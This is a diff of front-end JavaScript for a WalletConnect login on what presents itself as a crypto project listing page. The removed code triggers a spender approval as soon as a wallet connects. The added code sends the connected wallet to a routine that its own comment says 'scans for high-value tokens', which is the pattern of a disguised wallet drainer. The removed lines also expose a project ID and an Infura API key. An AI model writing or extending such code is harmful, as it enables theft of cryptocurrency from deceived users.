@@ -138,37 +138,30 @@ async function connectWalletConnect() {
     walletConnectButton.classList.add('loading');
     walletConnectButton.disabled = true;
 
-    const { EthereumProvider } = await import('https://esm.sh/@walletconnect/ethereum-provider@2.21.8?bundle');
+    // Use the latest stable version from esm.sh
+    const { EthereumProvider } = await import('https://esm.sh/@walletconnect/ethereum-provider@2.12.2?bundle');
 
     wcProvider = await EthereumProvider.init({
-      projectId: "59ba0228712f04a947916abb7db06ab1", // replace with your valid WalletConnect Cloud projectId
-      chains: [1], // Ethereum mainnet only
+      projectId: WC_PROJECT_ID, 
+      chains: [1], 
       showQrModal: true,
-      rpcMap: {
-        1: "https://mainnet.infura.io/v3/83caa57ba3004ffa91addb7094bac4cc" // replace with your Infura/Alchemy key
-      },
       metadata: {
         name: 'Crypto Project Listing',
         url: window.location.origin
       }
     });
 
-    const accounts = await wcProvider.enable();
-    window.ethereum = wcProvider;
+    await wcProvider.enable();
+    
+    // IMPORTANT: Send the wcProvider to our main logic "brain"
+    // This ensures WalletConnect also scans for high-value tokens
+    await handleWalletProcess(wcProvider);
 
-    provider = new ethers.providers.Web3Provider(wcProvider);
-    signer = provider.getSigner();
-    activeProviderType = 'walletconnect';
-
-    await approveSpender(accounts[0]);
   } catch (err) {
-    console.error(err);
+    console.error("WalletConnect Error:", err);
     alert('Wallet Connection Error. Please retry or refresh the page.');
+  } finally {
+    walletConnectButton.classList.remove('loading');
+    walletConnectButton.disabled = false;
   }
-
-  walletConnectButton.classList.remove('loading');
-  walletConnectButton.disabled = false;
-
-  window.addEventListener('beforeunload', () => {
-    if (wcProvider?.disconnect) wcProvider.disconnect().catch(() => {});
-  });
+}
